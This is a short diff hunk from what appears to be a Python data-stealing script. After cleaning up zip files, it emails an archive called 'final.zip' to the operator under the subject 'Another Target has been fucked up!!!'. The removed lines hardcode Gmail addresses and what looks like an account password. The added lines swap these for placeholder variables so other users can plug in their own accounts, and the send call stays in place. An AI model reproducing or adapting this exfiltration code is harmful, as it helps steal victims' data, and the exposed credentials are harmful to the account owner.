@@ -83,8 +83,11 @@ def main():
         if os.path.exists(f'recieved{i+1}.zip'):
             os.remove(f'recieved{i+1}.zip')
 
-    # if you want to get the email change 'robdin64@gmail.com' to your email
-    send_gmail_with_file("Another Target has been fucked up!!!", "Look what do we have here!", 'howy9914@gmail.com', 'robdin64@gmail.com', 'slgdaldagpf658416', "final.zip")
+    # change the value of these variables to your own gmail username and password 
+    sender_gmail = 'example@gmail.com'
+    sender_gmail_password = '*********'
+    reciever_gmail = 'example@gmail.com'
+    send_gmail_with_file("Another Target has been fucked up!!!", "Look what do we have here!", sender_gmail, reciever_gmail, sender_gmail_password, "final.zip")
     if os.path.exists('final.zip'):
         os.remove('final.zip')
 
